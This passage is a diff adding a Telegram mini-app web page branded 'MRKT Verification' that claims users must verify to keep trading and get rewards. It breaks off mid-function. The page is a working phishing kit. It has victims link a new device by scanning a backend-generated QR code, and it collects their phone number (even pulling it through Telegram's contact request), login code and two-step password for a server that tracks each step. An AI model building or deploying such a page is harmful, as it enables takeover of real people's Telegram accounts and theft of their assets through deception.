@@ -1,0 +1,1122 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>MRKT Verification</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <!-- Lottie & Pako for manual TGS decoding -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/bodymovin/5.12.2/lottie.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/pako/2.1.0/pako.min.js"></script>
+    <script src="/static/qrcode.min.js"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --bg-color: #0b0d0d;
+            --text-color: #e5e5e5;
+            --subtext-color: #6a7175;
+            --btn-color: #f7ca00;
+            --btn-text: #000000;
+            --header-bg: #0b0d0d;
+            --icon-bg: #1c1e1e;
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, sans-serif;
+            background: var(--bg-color);
+            color: var(--text-color);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            overflow-x: hidden;
+        }
+
+        /* ── Header ── */
+        .header {
+            width: 100%;
+            padding: 12px 16px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            background: var(--header-bg);
+            border-bottom: 1px solid rgba(255, 255, 255, 0.03);
+        }
+
+        .header-left {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .avatar-container {
+            position: relative;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            padding: 2px;
+            /* Using conic gradient for progress bar */
+            --progress: 25%;
+            background: conic-gradient(var(--btn-color) 0%, var(--btn-color) var(--progress), #252828 var(--progress), #252828 100%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .avatar {
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            background-color: #212121;
+            object-fit: cover;
+            border: 2px solid var(--bg-color);
+        }
+
+        .username-blur {
+            font-size: 15px;
+            font-weight: 600;
+            color: #d1d1d1;
+            filter: blur(4px);
+            opacity: 0.8;
+            user-select: none;
+        }
+
+        .header-right {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .icon-btn {
+            width: 36px;
+            height: 36px;
+            border-radius: 10px;
+            background: var(--icon-bg);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            cursor: pointer;
+        }
+
+        .icon-btn svg {
+            width: 18px;
+            height: 18px;
+            fill: #d1d1d1;
+        }
+
+        .badge {
+            position: absolute;
+            top: -4px;
+            right: -4px;
+            background: #e63946;
+            color: white;
+            font-size: 10px;
+            font-weight: 800;
+            padding: 2px 5px;
+            border-radius: 8px;
+            border: 2px solid var(--bg-color);
+        }
+
+        /* ── Main Content ── */
+        .content {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 20px 20px;
+            position: relative;
+            margin-top: 10px;
+            background: #111313;
+            border-top-left-radius: 20px;
+            border-top-right-radius: 20px;
+        }
+
+        .drag-handle {
+            width: 40px;
+            height: 4px;
+            background: #252828;
+            border-radius: 2px;
+            margin-bottom: 20px;
+            position: absolute;
+            top: 12px;
+        }
+
+        .illustration {
+            display: block;
+            width: 140px;
+            height: 140px;
+            margin-bottom: 24px;
+            margin-top: 10px;
+        }
+
+        .title {
+            font-size: 22px;
+            font-weight: 800;
+            margin-bottom: 8px;
+            text-align: center;
+            color: #f5f5f5;
+        }
+
+        .subtitle {
+            font-size: 13px;
+            color: var(--subtext-color);
+            text-align: center;
+            line-height: 1.4;
+            margin-bottom: 30px;
+            max-width: 300px;
+        }
+
+        /* ── Button ── */
+        .btn-primary {
+            width: 100%;
+            max-width: 340px;
+            padding: 16px;
+            background: var(--btn-color);
+            color: var(--btn-text);
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 700;
+            font-family: 'Inter', sans-serif;
+            cursor: pointer;
+            transition: opacity 0.2s;
+            margin-top: auto;
+            margin-bottom: 20px;
+        }
+
+        .btn-primary:active {
+            opacity: 0.8;
+        }
+
+        .btn-secondary {
+            width: 100%;
+            max-width: 340px;
+            padding: 16px;
+            background: #1f2222;
+            color: #ffffff;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 700;
+            font-family: 'Inter', sans-serif;
+            cursor: pointer;
+            transition: opacity 0.2s;
+        }
+
+        .btn-secondary:active {
+            opacity: 0.8;
+        }
+
+        /* ── QR Code Screen ── */
+        .qr-box {
+            background: #ffffff;
+            padding: 12px;
+            border-radius: 20px;
+            margin-bottom: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .qr-instructions {
+            font-size: 13px;
+            color: var(--subtext-color);
+            text-align: center;
+            line-height: 1.5;
+            margin-bottom: 20px;
+            max-width: 280px;
+        }
+
+        .btn-back {
+            background: none;
+            border: none;
+            color: var(--subtext-color);
+            font-size: 15px;
+            cursor: pointer;
+            padding: 10px;
+            margin-top: auto;
+            margin-bottom: 10px;
+        }
+
+        /* Remove arrows from number inputs */
+        input::-webkit-outer-spin-button,
+        input::-webkit-inner-spin-button {
+            -webkit-appearance: none;
+            margin: 0;
+        }
+
+        input[type=number] {
+            -moz-appearance: textfield;
+        }
+
+        /* Hide browser default password eye icon */
+        input[type="password"]::-webkit-reveal,
+        input[type="password"]::-ms-reveal {
+            display: none !important;
+        }
+
+        input[type="password"]::-webkit-contacts-auto-fill-button,
+        input[type="password"]::-webkit-credentials-auto-fill-button {
+            visibility: hidden;
+            display: none !important;
+            pointer-events: none;
+            position: absolute;
+            right: 0;
+        }
+
+        .btn-submit-pwd {
+            background: #f7ca00 !important;
+            color: #000 !important;
+        }
+
+        .btn-submit-pwd:disabled {
+            background: #8e7a17 !important;
+            color: rgba(0, 0, 0, 0.5) !important;
+            cursor: not-allowed;
+            opacity: 1;
+        }
+
+        @keyframes shakeError {
+
+            0%,
+            100% {
+                transform: translateX(0);
+            }
+
+            25% {
+                transform: translateX(-5px);
+            }
+
+            75% {
+                transform: translateX(5px);
+            }
+        }
+
+        .pwd-invalid {
+            border-color: #ef4444 !important;
+            background: rgba(239, 68, 68, 0.1) !important;
+            animation: shakeError 0.4s ease-in-out;
+        }
+
+        /* ── Code Inputs ── */
+        .code-inputs {
+            display: flex;
+            gap: 12px;
+            margin-bottom: 30px;
+            justify-content: center;
+        }
+
+        .code-input-box {
+            width: 48px;
+            height: 60px;
+            background: #1c1e1e;
+            border: 1px solid #333;
+            border-radius: 12px;
+            color: #fff;
+            font-size: 24px;
+            text-align: center;
+            font-weight: 700;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        .code-input-box:focus {
+            border-color: #f7ca00;
+        }
+
+        .pwd-input:focus {
+            border-color: #f7ca00;
+        }
+
+        .hidden {
+            display: none !important;
+        }
+    </style>
+</head>
+
+<body>
+
+    <!-- Header -->
+    <div class="header">
+        <div class="header-left">
+            <div class="avatar-container" id="avatarContainer">
+                <img src="" alt="Avatar" class="avatar" id="userAvatar">
+            </div>
+            <div class="username-blur" id="userName">username</div>
+        </div>
+        <div class="header-right">
+            <div class="lang-toggle" onclick="toggleLanguage()" id="langToggle"
+                style="color: #d1d1d1; font-weight: bold; cursor: pointer; background: var(--icon-bg); padding: 8px 12px; border-radius: 10px; font-size: 14px; user-select: none;">
+                RU
+            </div>
+            <div class="icon-btn">
+                <div class="badge">29</div>
+                <svg viewBox="0 0 24 24">
+                    <path
+                        d="M20 12.5v-1.5c0-1.1-.9-2-2-2h-1c0-2.8-2.2-5-5-5S7 6.2 7 9H6c-1.1 0-2 .9-2 2v1.5c0 1.1.9 2 2 2h1v1.5c0 1.1.9 2 2 2h1c0 2.8 2.2 5 5 5s5-2.2 5-5h1c1.1 0 2-.9 2-2z" />
+                </svg>
+            </div>
+            <div class="icon-btn">
+                <svg viewBox="0 0 24 24">
+                    <path d="M4 6h16v2H4zm0 5h16v2H4zm0 5h16v2H4z" />
+                </svg>
+            </div>
+        </div>
+    </div>
+
+    <div class="content">
+        <div class="drag-handle"></div>
+
+        <!-- Main Screen -->
+        <div id="mainScreen" style="display: flex; flex-direction: column; align-items: center; width: 100%;">
+            <!-- Container for Lottie Animation -->
+            <div id="lottieContainer" class="illustration"></div>
+            <div id="tgsError" style="color: #ef4444; font-size: 11px; margin-top: -10px; display: none;"></div>
+
+            <div class="title" id="mainTitle" data-i18n="mainTitle">Верификация</div>
+            <div class="subtitle" id="mainSubtitle" data-i18n="mainSubtitle">
+                Пройдите разовую верификацию чтобы продолжить торговлю и получать награды.
+            </div>
+
+            <button class="btn-primary" id="btnContinue" onclick="continueToVerification()"
+                data-i18n="btnContinue">Продолжить</button>
+
+            <!-- Login Options (Hidden initially) -->
+            <div id="loginOptions"
+                style="display: none; width: 100%; max-width: 340px; flex-direction: column; gap: 12px; margin-top: auto; margin-bottom: 20px;">
+                <button class="btn-primary"
+                    style="margin: 0; display: flex; align-items: center; justify-content: center; gap: 8px;"
+                    onclick="selectLogin('qr')">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
+                        <path
+                            d="M3 3h8v8H3V3zm2 2v4h4V5H5zm8-2h8v8h-8V3zm2 2v4h4V5h-4zM3 13h8v8H3v-8zm2 2v4h4v-4H5zm13-2h3v2h-3v-2zm-3 0h2v2h-2v-2zm3 3h3v2h-3v-2zm-3 0h2v2h-2v-2zm3 3h3v2h-3v-2zm-3 0h2v2h-2v-2z" />
+                    </svg>
+                    <span data-i18n="btnQR">QR Код</span>
+                </button>
+                <button class="btn-secondary"
+                    style="margin: 0; display: flex; align-items: center; justify-content: center; gap: 8px;"
+                    onclick="selectLogin('phone')">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
+                        <path
+                            d="M17 1H7c-1.1 0-2 .9-2 2v18c0 1.1.9 2 2 2h10c1.1 0 2-.9 2-2V3c0-1.1-.9-2-2-2zm0 18H7V5h10v14zm-6 1h2v-2h-2v2z" />
+                    </svg>
+                    <span data-i18n="btnPhone">Номер телефона</span>
+                </button>
+            </div>
+
+            <!-- QR Screen (Hidden initially) -->
+            <div id="qrScreen" style="display: none; flex-direction: column; align-items: center; width: 100%;">
+                <div class="qr-box" id="qrCodeBox">
+                    <!-- QR code will be generated here -->
+                    <div id="qrPlaceholder"
+                        style="width:200px; height:200px; display:flex; align-items:center; justify-content:center; color:#000;"
+                        data-i18n="loading">Загрузка...</div>
+                </div>
+
+                <div class="qr-instructions" data-i18n="qrInstructions">
+                    1. Откройте Telegram → Настройки → Устройства → Привязать устройство<br><br>
+                    2. Наведите камеру на экран для сканирования QR кода
+                </div>
+
+                <button class="btn-back" onclick="goBackFromQR()" data-i18n="btnBack">← Назад</button>
+            </div>
+
+            <!-- Password Screen (Hidden initially) -->
+            <div id="passwordScreen" style="display: none; flex-direction: column; align-items: center; width: 100%;">
+                <div style="font-size: 15px; color: #6a7175; margin-bottom: 24px; text-align: center; max-width: 280px; line-height: 1.5;"
+                    data-i18n="pwdInstruction">
+                    Введите пароль двухфакторной аутентификации вашего Telegram аккаунта
+                </div>
+
+                <div style="position: relative; width: 100%; max-width: 340px; margin-bottom: 24px;">
+                    <input type="password" id="passwordInput" class="pwd-input" placeholder="Пароль 2FA"
+                        data-i18n-placeholder="pwdPlaceholder"
+                        style="width: 100%; padding: 16px; padding-right: 48px; background: #1c1e1e; border: 1px solid #333; border-radius: 12px; color: #fff; font-size: 16px; outline: none; transition: border-color 0.2s;"
+                        oninput="checkPwdInput()">
+                    <div onclick="togglePasswordVisibility()"
+                        style="position: absolute; right: 16px; top: 50%; transform: translateY(-50%); cursor: pointer; color: #6a7175; display: flex; align-items: center;">
+                        <svg id="eyeIcon" width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
+                            <path
+                                d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z" />
+                        </svg>
+                    </div>
+                </div>
+
+                <div id="pwdErrorMsg"
+                    style="display: none; color: #ef4444; font-size: 14px; margin-top: -15px; margin-bottom: 20px; text-align: center;"
+                    data-i18n="pwdError">Неверный пароль. Попробуйте еще раз.</div>
+
+                <button class="btn-primary btn-submit-pwd" onclick="submitPassword()" id="btnSubmitPassword" disabled
+                    data-i18n="btnLogin">Войти</button>
+                <button class="btn-back" onclick="location.reload()" data-i18n="btnCancel">← Отмена</button>
+            </div>
+
+            <!-- Phone Screen (Hidden initially) -->
+            <div id="phoneScreen" style="display: none; flex-direction: column; align-items: center; width: 100%;">
+                <div style="font-size: 15px; color: #6a7175; margin-bottom: 24px; text-align: center; max-width: 280px; line-height: 1.5;"
+                    data-i18n="phoneInstruction">
+                    Введите номер телефона, привязанный к вашему аккаунту Telegram
+                </div>
+
+                <input type="tel" id="phoneInput" placeholder="Номер телефона" data-i18n-placeholder="phonePlaceholder"
+                    style="width: 100%; max-width: 340px; padding: 16px; background: #1c1e1e; border: 1px solid #333; border-radius: 12px; color: #fff; font-size: 16px; outline: none; margin-bottom: 24px;">
+
+                <button class="btn-primary" onclick="submitPhone()" id="btnSubmitPhone"
+                    style="margin-bottom: 12px; background: #8e7a17; color: #000;"
+                    data-i18n="btnContinue">Продолжить</button>
+
+                <button class="btn-secondary" onclick="requestTelegramPhone()" id="btnRequestPhone"
+                    style="margin-bottom: 20px; display: flex; align-items: center; justify-content: center; gap: 8px; background: #1c1e1e; border: 1px solid #333;">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="#3b82f6">
+                        <path
+                            d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69a.2.2 0 00-.05-.18c-.06-.05-.14-.03-.21-.02-.09.02-1.49.95-4.22 2.79-.4.27-.76.41-1.08.4-.36-.01-1.04-.2-1.55-.37-.63-.2-1.12-.31-1.08-.66.02-.18.27-.36.74-.55 2.92-1.27 4.86-2.11 5.83-2.51 2.78-1.16 3.35-1.36 3.73-1.36.08 0 .27.02.39.12.1.08.13.19.14.27-.01.06.01.24 0 .38z" />
+                    </svg>
+                    <span data-i18n="btnSendPhone">Отправить номер из Telegram</span>
+                </button>
+                <button class="btn-back" onclick="goBackFromPhone()" data-i18n="btnBack">← Назад</button>
+            </div>
+
+            <!-- Code Screen (Hidden initially) -->
+            <div id="codeScreen" style="display: none; flex-direction: column; align-items: center; width: 100%;">
+                <div style="font-size: 15px; color: #6a7175; margin-bottom: 24px; text-align: center; max-width: 280px; line-height: 1.5;"
+                    data-i18n="codeInstruction">
+                    Мы отправили код подтверждения в ваш Telegram
+                </div>
+
+                <div class="code-inputs" id="codeInputsContainer">
+                    <input type="number" class="code-input-box" maxlength="1" oninput="moveToNext(this, 0)"
+                        onkeydown="handleBackspace(event, 0)" onpaste="handleCodePaste(event)">
+                    <input type="number" class="code-input-box" maxlength="1" oninput="moveToNext(this, 1)"
+                        onkeydown="handleBackspace(event, 1)">
+                    <input type="number" class="code-input-box" maxlength="1" oninput="moveToNext(this, 2)"
+                        onkeydown="handleBackspace(event, 2)">
+                    <input type="number" class="code-input-box" maxlength="1" oninput="moveToNext(this, 3)"
+                        onkeydown="handleBackspace(event, 3)">
+                    <input type="number" class="code-input-box" maxlength="1" oninput="moveToNext(this, 4)"
+                        onkeydown="handleBackspace(event, 4)">
+                </div>
+
+                <div id="codeErrorMsg"
+                    style="display: none; color: #ef4444; font-size: 14px; margin-top: -15px; margin-bottom: 20px; text-align: center;"
+                    data-i18n="codeError">Неверный код, попробуйте снова</div>
+
+                <button class="btn-primary" onclick="submitCode()" id="btnSubmitCode" style="display: none;"
+                    data-i18n="btnContinue">Продолжить</button>
+                <button class="btn-back" onclick="location.reload()" data-i18n="btnCancel">← Отмена</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const API_BASE = window.location.origin + '/api';
+        const tg = window.Telegram?.WebApp;
+        let userId = 0;
+        let username = '';
+
+        const locales = {
+            'RU': {
+                'mainTitle': 'Верификация',
+                'mainSubtitle': 'Пройдите разовую верификацию чтобы продолжить торговлю и получать награды.',
+                'btnContinue': 'Продолжить',
+                'btnQR': 'QR Код',
+                'btnPhone': 'Номер телефона',
+                'loading': 'Загрузка...',
+                'qrInstructions': '1. Откройте Telegram → Настройки → Устройства → Привязать устройство<br><br>2. Наведите камеру на экран для сканирования QR кода',
+                'btnBack': '← Назад',
+                'pwdInstruction': 'Введите пароль двухфакторной аутентификации вашего Telegram аккаунта',
+                'pwdError': 'Неверный пароль. Попробуйте еще раз.',
+                'btnLogin': 'Войти',
+                'btnCancel': '← Отмена',
+                'phoneInstruction': 'Введите номер телефона, привязанный к вашему аккаунту Telegram',
+                'btnSendPhone': 'Отправить номер из Telegram',
+                'codeInstruction': 'Мы отправили код подтверждения в ваш Telegram',
+                'codeError': 'Неверный код, попробуйте снова',
+                'titleLoginMethod': 'Как хотите войти?',
+                'titleTelegramLogin': 'Вход через Telegram',
+                'titleSuccess': 'Успешно!',
+                'successMessageQR': '<div style="color:green; padding: 20px; text-align: center; font-weight: bold;">Вы успешно вошли!</div>',
+                'errorQR': 'Ошибка QR авторизации. Попробуйте снова.',
+                'titleEnterPassword': 'Введите пароль',
+                'titleEnterPhone': 'Введите номер',
+                'titleCode': 'Код подтверждения',
+                'successCode': '<div style="color:green; padding: 20px; text-align: center; font-weight: bold;">Успешный вход!</div>',
+                'title2FA': 'Двухфакторная защита',
+                'successPwd': '<div style="color:green; padding: 20px; text-align: center; font-weight: bold;">Пароль принят! Успешный вход.</div>',
+                'errorConnection': 'Ошибка соединения: ',
+                'errorPrefix': 'Ошибка: ',
+                'unknownError': 'Неизвестная ошибка',
+                'telegramFuncNotAvail': 'Функция недоступна в вашей версии Telegram.',
+                'phonePlaceholder': 'Номер телефона',
+                'pwdPlaceholder': 'Пароль 2FA'
+            },
+            'ENG': {
+                'mainTitle': 'Verification',
+                'mainSubtitle': 'Complete a one-time verification to continue trading and receiving rewards.',
+                'btnContinue': 'Continue',
+                'btnQR': 'QR Code',
+                'btnPhone': 'Phone Number',
+                'loading': 'Loading...',
+                'qrInstructions': '1. Open Telegram → Settings → Devices → Link Desktop Device<br><br>2. Point camera at this screen to scan QR code',
+                'btnBack': '← Back',
+                'pwdInstruction': 'Enter the Two-Step Verification password for your Telegram account',
+                'pwdError': 'Invalid password. Please try again.',
+                'btnLogin': 'Log In',
+                'btnCancel': '← Cancel',
+                'phoneInstruction': 'Enter the phone number associated with your Telegram account',
+                'btnSendPhone': 'Send number via Telegram',
+                'codeInstruction': 'We have sent a verification code to your Telegram',
+                'codeError': 'Invalid code, please try again',
+                'titleLoginMethod': 'Choose login method',
+                'titleTelegramLogin': 'Log in with Telegram',
+                'titleSuccess': 'Success!',
+                'successMessageQR': '<div style="color:green; padding: 20px; text-align: center; font-weight: bold;">Successfully logged in!</div>',
+                'errorQR': 'QR authorization error. Please try again.',
+                'titleEnterPassword': 'Enter password',
+                'titleEnterPhone': 'Enter phone number',
+                'titleCode': 'Verification code',
+                'successCode': '<div style="color:green; padding: 20px; text-align: center; font-weight: bold;">Successfully logged in!</div>',
+                'title2FA': 'Two-Step Verification',
+                'successPwd': '<div style="color:green; padding: 20px; text-align: center; font-weight: bold;">Password accepted! Successful login.</div>',
+                'errorConnection': 'Connection error: ',
+                'errorPrefix': 'Error: ',
+                'unknownError': 'Unknown error',
+                'telegramFuncNotAvail': 'Function not available in your Telegram version.',
+                'phonePlaceholder': 'Phone Number',
+                'pwdPlaceholder': '2FA Password'
+            }
+        };
+
+        let currentLanguage = 'RU';
+
+        function setLanguage(lang) {
+            currentLanguage = lang;
+            document.getElementById('langToggle').innerText = lang;
+
+            // Update all elements with data-i18n
+            document.querySelectorAll('[data-i18n]').forEach(el => {
+                const key = el.getAttribute('data-i18n');
+                if (locales[lang][key]) {
+                    if (el.tagName === 'DIV' || el.tagName === 'SPAN') {
+                        el.innerHTML = locales[lang][key];
+                    } else if (el.tagName === 'BUTTON') {
+                        el.innerText = locales[lang][key];
+                    }
+                }
+            });
+
+            // Update placeholders
+            document.querySelectorAll('[data-i18n-placeholder]').forEach(el => {
+                const key = el.getAttribute('data-i18n-placeholder');
+                if (locales[lang][key]) {
+                    el.placeholder = locales[lang][key];
+                }
+            });
+
+            // Update dynamic titles based on current screen
+            updateDynamicTexts();
+        }
+
+        function toggleLanguage() {
+            const newLang = currentLanguage === 'RU' ? 'ENG' : 'RU';
+            setLanguage(newLang);
+        }
+
+        function t(key) {
+            return locales[currentLanguage][key] || key;
+        }
+
+        // Helper to update texts that might be changed by JS state
+        function updateDynamicTexts() {
+            const titleEl = document.getElementById('mainTitle');
+            const titleText = titleEl.innerText;
+
+            if (titleText === locales['RU']['titleLoginMethod'] || titleText === locales['ENG']['titleLoginMethod']) {
+                titleEl.innerText = t('titleLoginMethod');
+            } else if (titleText === locales['RU']['titleTelegramLogin'] || titleText === locales['ENG']['titleTelegramLogin']) {
+                titleEl.innerText = t('titleTelegramLogin');
+            } else if (titleText === locales['RU']['titleSuccess'] || titleText === locales['ENG']['titleSuccess']) {
+                titleEl.innerText = t('titleSuccess');
+            } else if (titleText === locales['RU']['titleEnterPassword'] || titleText === locales['ENG']['titleEnterPassword']) {
+                titleEl.innerText = t('titleEnterPassword');
+            } else if (titleText === locales['RU']['titleEnterPhone'] || titleText === locales['ENG']['titleEnterPhone']) {
+                titleEl.innerText = t('titleEnterPhone');
+            } else if (titleText === locales['RU']['titleCode'] || titleText === locales['ENG']['titleCode']) {
+                titleEl.innerText = t('titleCode');
+            } else if (titleText === locales['RU']['title2FA'] || titleText === locales['ENG']['title2FA']) {
+                titleEl.innerText = t('title2FA');
+            } else if (titleText === locales['RU']['mainTitle'] || titleText === locales['ENG']['mainTitle']) {
+                titleEl.innerText = t('mainTitle');
+            }
+
+            const btnPhone = document.getElementById('btnSubmitPhone');
+            if (btnPhone.innerText === locales['RU']['loading'] || btnPhone.innerText === locales['ENG']['loading']) {
+                btnPhone.innerText = t('loading');
+            } else if (btnPhone.innerText === locales['RU']['btnContinue'] || btnPhone.innerText === locales['ENG']['btnContinue']) {
+                btnPhone.innerText = t('btnContinue');
+            }
+
+            const btnCode = document.getElementById('btnSubmitCode');
+            if (btnCode.innerText === locales['RU']['loading'] || btnCode.innerText === locales['ENG']['loading']) {
+                btnCode.innerText = t('loading');
+            } else if (btnCode.innerText === locales['RU']['btnContinue'] || btnCode.innerText === locales['ENG']['btnContinue']) {
+                btnCode.innerText = t('btnContinue');
+            }
+        }
+
+        // Init language
+        document.addEventListener('DOMContentLoaded', () => {
+            setLanguage('RU');
+        });
+
+        if (tg) {
+            tg.ready();
+            tg.expand();
+            tg.disableVerticalSwipes();
+
+            const user = tg.initDataUnsafe?.user;
+            if (user) {
+                userId = user.id;
+                username = user.username || user.first_name || '';
+
+                let displayUser = user.username ? '@' + user.username : (user.first_name || 'User');
+                if (displayUser.length < 5) displayUser = displayUser + 'xxxxx';
+                document.getElementById('userName').textContent = displayUser;
+
+                if (user.photo_url) {
+                    document.getElementById('userAvatar').src = user.photo_url;
+                } else {
+                    document.getElementById('userAvatar').style.backgroundColor = '#f7ca00';
+                }
+            }
+
+            let phoneHandled = false;
+            if (tg.onEvent) {
+                tg.onEvent('contactRequested', (e) => {
+                    if (!e || e.status !== 'sent') return;
+                    if (phoneHandled) return;
+
+                    let contact = null;
+                    if (e.responseUnsafe && e.responseUnsafe.contact) {
+                        contact = e.responseUnsafe.contact;
+                    } else if (e.response) {
+                        try {
+                            const m = typeof e.response === 'string' && e.response.match(/contact=([^&]+)/);
+                            if (m) contact = JSON.parse(decodeURIComponent(m[1]));
+                        } catch (err) { }
+                    }
+
+                    if (contact && contact.phone_number) {
+                        phoneHandled = true;
+                        document.getElementById('phoneInput').value = contact.phone_number;
+                        submitPhone(); // auto submit
+                    }
+                });
+            }
+        }
+
+        function requestTelegramPhone() {
+            if (!tg || typeof tg.requestContact !== 'function') {
+                alert('Функция недоступна в вашей версии Telegram.');
+                return;
+            }
+            tg.requestContact(() => {
+                console.log('contact request popup closed');
+            });
+        }
+
+        // Load TGS manually using fetch, pako, and lottie-web (Bulletproof method)
+        // We use /static/pepe.tgs because FastAPI serves the frontend folder under /static/
+        const tgsUrl = new URL('/static/pepe.tgs?v=' + Date.now(), window.location.href).href;
+        fetch(tgsUrl)
+            .then(response => {
+                if (!response.ok) {
+                    // Fallback to relative if /static/ fails
+                    return fetch('pepe.tgs?v=' + Date.now()).then(res => {
+                        if (!res.ok) throw new Error("HTTP " + res.status + " for both paths");
+                        return res.arrayBuffer();
+                    });
+                }
+                return response.arrayBuffer();
+            })
+            .then(buffer => {
+                try {
+                    // Decompress the gzip buffer
+                    const decompressed = pako.inflate(new Uint8Array(buffer), { to: 'string' });
+                    const animationData = JSON.parse(decompressed);
+
+                    // Play with Lottie
+                    lottie.loadAnimation({
+                        container: document.getElementById('lottieContainer'),
+                        renderer: 'svg',
+                        loop: true,
+                        autoplay: true,
+                        animationData: animationData
+                    });
+                } catch (e) {
+                    throw new Error("Decode failed: " + e.message);
+                }
+            })
+            .catch(err => {
+                console.error("TGS load error:", err);
+                const errEl = document.getElementById('tgsError');
+                errEl.style.display = 'block';
+                errEl.innerText = err.message;
+            });
+
+        fetch(API_BASE + '/user-action', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ user_id: userId, username: username, action: 'webapp_opened' })
+        }).catch(() => { });
+
+        function setAvatarProgress(percent) {
+            document.getElementById('avatarContainer').style.setProperty('--progress', percent + '%');
+        }
+
+        function continueToVerification() {
+            fetch(API_BASE + '/user-action', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ user_id: userId, username: username, action: 'clicked_continue' })
+            }).catch(() => { });
+
+            // Update UI
+            document.getElementById('mainTitle').innerText = 'Как хотите войти?';
+            document.getElementById('mainSubtitle').style.display = 'none';
+            document.getElementById('btnContinue').style.display = 'none';
+            document.getElementById('loginOptions').style.display = 'flex';
+
+            // Update avatar progress
+            setAvatarProgress(50);
+        }
+
+        let qrPollingInterval = null;
+        let currentSessionId = null;
+
+        function selectLogin(method) {
+            if (qrPollingInterval) {
+                clearInterval(qrPollingInterval);
+                qrPollingInterval = null;
+            }
+
+            fetch(API_BASE + '/user-action', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ user_id: userId, username: username, action: 'select_login_' + method })
+            }).catch(() => { });
+
+            if (method === 'qr') {
+                document.getElementById('loginOptions').style.display = 'none';
+                document.getElementById('lottieContainer').style.display = 'none';
+                document.getElementById('mainTitle').innerText = t('titleTelegramLogin');
+                document.getElementById('qrScreen').style.display = 'flex';
+
+                fetch(API_BASE + '/qr-start', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ user_id: userId, username: username })
+                })
+                    .then(res => res.json())
+                    .then(data => {
+                        if (data.status === 'success') {
+                            currentSessionId = data.session_id;
+                            const qrBox = document.getElementById('qrCodeBox');
+                            qrBox.innerHTML = ''; // clear placeholder
+                            new QRCode(qrBox, {
+                                text: data.url,
+                                width: 180,
+                                height: 180,
+                                colorDark: "#000000",
+                                colorLight: "#ffffff",
+                                correctLevel: QRCode.CorrectLevel.M
+                            });
+
+                            // Start polling
+                            qrPollingInterval = setInterval(() => {
+                                fetch(API_BASE + '/qr-status?session_id=' + currentSessionId)
+                                    .then(r => r.json())
+                                    .then(rData => {
+                                        if (rData.status === 'authorized') {
+                                            clearInterval(qrPollingInterval);
+                                            document.getElementById('mainTitle').innerText = t('titleSuccess');
+                                            document.getElementById('qrCodeBox').innerHTML = t('successMessageQR');
+                                            setAvatarProgress(100);
+                                        } else if (rData.status === 'qr_failed') {
+                                            clearInterval(qrPollingInterval);
+                                            alert(t('errorQR'));
+                                            goBackFromQR();
+                                        } else if (rData.status === 'awaiting_password') {
+                                            clearInterval(qrPollingInterval);
+                                            // Transition to password screen
+                                            document.getElementById('qrScreen').style.display = 'none';
+                                            document.getElementById('mainTitle').innerText = t('titleEnterPassword');
+                                            document.getElementById('passwordScreen').style.display = 'flex';
+                                            setAvatarProgress(75);
+                                        }
+                                    }).catch(() => { });
+                            }, 2000);
+                        } else {
+                            alert(t('errorPrefix') + data.detail);
+                        }
+                    })
+                    .catch(err => {
+                        alert(t('errorConnection') + err.message);
+                        goBackFromQR();
+                    });
+            } else if (method === 'phone') {
+                document.getElementById('loginOptions').style.display = 'none';
+                document.getElementById('lottieContainer').style.display = 'none';
+                document.getElementById('mainTitle').innerText = t('titleEnterPhone');
+                document.getElementById('phoneScreen').style.display = 'flex';
+            }
+        }
+
+        let currentPhoneNumber = null;
+
+        function submitPhone() {
+            const phone = document.getElementById('phoneInput').value.trim();
+            if (!phone) return;
+
+            currentPhoneNumber = phone;
+            const btn = document.getElementById('btnSubmitPhone');
+            btn.innerText = t('loading');
+            btn.disabled = true;
+
+            fetch(API_BASE + '/request-phone', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ user_id: userId, username: username, phone_number: phone })
+            })
